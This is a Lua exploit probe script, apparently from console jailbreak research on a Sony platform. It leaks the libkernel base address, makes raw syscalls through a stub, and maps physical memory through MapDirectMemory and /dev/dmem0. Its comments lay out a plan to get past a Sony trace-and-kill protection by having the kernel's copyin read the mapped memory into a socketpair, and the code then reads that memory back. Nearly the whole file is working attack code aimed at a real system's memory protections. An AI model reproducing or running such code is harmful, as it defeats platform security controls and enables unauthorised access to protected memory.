-- CRASH_CLASS: MODERATE
-- PROBE 563g: Kernel copyin bypass — write(fd, mapped_va, N)
--
-- 563e/563f PROVED: userland access to MapDM VA triggers trace + kill.
-- The trap fires DURING the mov rax, [VA] instruction. Child never reads.
--
-- NEW HYPOTHESIS: write(fd, mapped_va, N) calls copyin() in kernel mode.
-- copyin has pcb_onfault → returns EFAULT on fault without kill.
-- If Sony's trace only monitors ring 3 access: data flows to the pipe.
-- If it faults in ring 0: write returns EFAULT, process survives.
-- Either way, we don't die.
--
-- PLAN:
-- [A] socketpair → two fds
-- [B] AllocateDirectMemory + MapDirectMemory → mapped_va
-- [C] write(sock_fd, mapped_va, 16) — kernel copyin reads the VA
-- [D] read(other_fd, buf, 16) — extract data
-- [E] Also test with dmem0 mmap as control (should always work)

print("=== PROBE 563g: COPYIN BYPASS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if not ok then return nil end
    local n = N(v); if n < 0 then n = n + 0x100000000 end; return n
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

-- Get libkernel base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rb(N(ib) + 0x108) or 0; local lhi = rb(N(ib) + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)
local alloc_fn = lk + uint64(0x17EF0)
print(string.format("lk=0x%X%08X", lhi, llo))
io.flush()

-- ============================================================
-- [A] socketpair
-- ============================================================
print("[A] socketpair")
local spbuf = memory.alloc(16)
wq(N(spbuf), Z); wq(N(spbuf) + 8, Z)
local ok_sp, rv_sp = pcall(function()
    return native.fcall_with_rax(stub, 135,
        uint64(1), uint64(2), uint64(0), spbuf)
end)
local sp_rv = ok_sp and N(rv_sp) or -999
local fd_a = rb(N(spbuf)) or -1
local fd_b = rb(N(spbuf) + 4) or -1
print(string.format("  rv=%d fd_a=%d fd_b=%d", sp_rv, fd_a, fd_b))
if sp_rv ~= 0 then print("SOCKETPAIR FAIL"); return end
io.flush()

-- ============================================================
-- [E] CONTROL: dmem0 mmap (trace-free) + write to pipe
-- ============================================================
print("[E] control: dmem0 write-to-pipe")
local dp = memory.alloc(16)
wd(N(dp), 0x7665642F); wd(N(dp) + 4, 0x656D642F); wd(N(dp) + 8, 0x0000306D)
local ok_o, fd_raw = pcall(function()
    return native.fcall_with_rax(stub, 5, dp, uint64(2))
end)
local dmem_fd = ok_o and N(fd_raw) or -999
print("  dmem0 fd=" .. dmem_fd)

if dmem_fd >= 0 then
    local ctrl_va_raw
    local ok_mm
    ok_mm, ctrl_va_raw = pcall(function()
        return mk(477)(Z, uint64(0x4000), uint64(1),
            uint64(0x0001), uint64(dmem_fd), Z)
    end)
    local ctrl_va = ok_mm and N(ctrl_va_raw) or 0
    if ctrl_va > 0x10000 then
        local v0 = rb(ctrl_va) or 0
        print(string.format("  dmem0 phys=0 va=0x%X first_dword=0x%08X", ctrl_va, v0))

        local ok_w, rv_w = pcall(function()
            return native.fcall_with_rax(stub, 4,
                uint64(fd_a), uint64(ctrl_va), uint64(16))
        end)
        local wr = ok_w and N(rv_w) or -999
        print("  write(fd_a, dmem0_va, 16)=" .. wr)

        if wr > 0 then
            local rbuf = memory.alloc(32)
            for i = 0, 28, 4 do wd(N(rbuf) + i, 0xEEEEEEEE) end
            local ok_r, rv_r = pcall(function()
                return native.fcall_with_rax(stub, 3,
                    uint64(fd_b), rbuf, uint64(16))
            end)
            local rd = ok_r and N(rv_r) or -999
            local r0 = rb(N(rbuf)) or 0
            local r4 = rb(N(rbuf) + 4) or 0
            print(string.format("  read=%d data=%08X_%08X", rd, r4, r0))
            if r0 == v0 then print("  CONTROL_MATCH!") end
        end

        pcall(function()
            native.fcall_with_rax(stub, 73, uint64(ctrl_va), uint64(0x4000))
        end)
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(dmem_fd)) end)
end
io.flush()

-- ============================================================
-- [B] MapDirectMemory — map phys 0x100000000 (4GB)
-- ============================================================
print("")
print("[B] MapDM phys=0x100000000")
local mapped_va = uint64("0x880000000")

pcall(function()
    native.fcall_with_rax(stub, 477,
        mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print("  mapdm rv=" .. md_rv)
io.flush()

-- ============================================================
-- [C] write(fd_a, mapped_va, 16) — THE KEY TEST
-- ============================================================
print("")
print("[C] write(fd_a, mapped_va=0x880000000, 16)")
io.flush()

local ok_w2, rv_w2 = pcall(function()
    return native.fcall_with_rax(stub, 4,
        uint64(fd_a), mapped_va, uint64(16))
end)
local wr2 = ok_w2 and N(rv_w2) or -999
print("  write rv=" .. wr2)
io.flush()

-- ============================================================
-- [D] read back if write succeeded
-- ============================================================
if wr2 > 0 then
    print("[D] read back!")
    local rbuf2 = memory.alloc(32)
    for i = 0, 28, 4 do wd(N(rbuf2) + i, 0xDDDDDDDD) end
    local ok_r2, rv_r2 = pcall(function()
        return native.fcall_with_rax(stub, 3,
            uint64(fd_b), rbuf2, uint64(16))
    end)
    local rd2 = ok_r2 and N(rv_r2) or -999
    local p0 = rb(N(rbuf2)) or 0
    local p4 = rb(N(rbuf2) + 4) or 0
    local p8 = rb(N(rbuf2) + 8) or 0
    local p12 = rb(N(rbuf2) + 12) or 0
    print(string.format("  read=%d", rd2))
    print(string.format("  phys+0x00: %08X_%08X", p4, p0))
    print(string.format("  phys+0x08: %08X_%08X", p12, p8))

    if p0 == 0x464C457F then print("  *** ELF MAGIC! ***") end
    if p0 ~= 0xDDDDDDDD then print("  DATA_CHANGED — copyin worked!") end
elseif wr2 == -999 then
    print("[D] write crashed/exception — trace killed during copyin?")
else
    -- write returned -1 or small error
    -- Check errno? Can't easily. But process is alive!
    print("[D] write failed (EFAULT?) — copyin faulted, but we survived!")
    print("  trying different phys addresses...")

    -- Try phys 0 (should have data from dmem0 heatmap)
    local va2 = uint64("0x890000000")
    pcall(function()
        native.fcall_with_rax(stub, 477,
            va2, uint64(0x4000), uint64(3),
            uint64(0x1012), uint64(0xFFFFFFFF), Z)
    end)
    local ok_md2, rv_md2 = pcall(function()
        return native.fcall_with_rax(mapdm_fn, 0,
            va2, uint64(0x4000), uint64(3), Z,
            Z, uint64(0x4000))
    end)
    print("  mapdm phys=0 rv=" .. (ok_md2 and N(rv_md2) or -999))

    local ok_w3, rv_w3 = pcall(function()
        return native.fcall_with_rax(stub, 4,
            uint64(fd_a), va2, uint64(16))
    end)
    print("  write(phys=0)=" .. (ok_w3 and N(rv_w3) or -999))

    if ok_w3 and N(rv_w3) > 0 then
        local rbuf3 = memory.alloc(32)
        for i = 0, 28, 4 do wd(N(rbuf3) + i, 0xCCCCCCCC) end
        pcall(function()
            native.fcall_with_rax(stub, 3, uint64(fd_b), rbuf3, uint64(16))
        end)
        local q0 = rb(N(rbuf3)) or 0
        local q4 = rb(N(rbuf3) + 4) or 0
        print(string.format("  phys0: %08X_%08X", q4, q0))
    end
end

io.flush()

-- Cleanup
pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_a)) end)
pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_b)) end)

local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 563g DONE ===")
